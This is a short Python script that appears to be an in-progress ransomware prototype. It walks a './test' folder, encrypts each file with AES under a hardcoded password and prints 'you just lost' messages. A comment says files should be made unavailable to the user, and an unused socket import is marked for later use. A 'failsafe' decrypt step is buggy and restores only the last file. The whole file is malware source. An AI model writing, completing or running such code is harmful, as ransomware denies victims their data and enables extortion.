import os,time,socket
# socket is not used just yet
import pyAesCrypt
buffer = 128 * 1024
guessme = "guessme"
def lockit_test():
   for root, dirs, files in os.walk("./test", topdown=False):
      for name in files:
         print(f"you just lost {os.path.join(root, name)})")
         cur = str(os.path.join(root, name))
         # ensure files arent availabe to user
         """with open(f"{new1}","w") as runr:
          runr.write("changed your files")
          runr.close()
        """
         pyAesCrypt.encryptFile(f"{cur}", f"{cur}.aes", passw=guessme, bufferSize=buffer)
         time.sleep(0.5)
      #current failsafe, replacing later
      pyAesCrypt.decryptFile(f"{cur}.aes", f"{cur}.backup.copy.txt", passw=guessme, bufferSize=buffer)


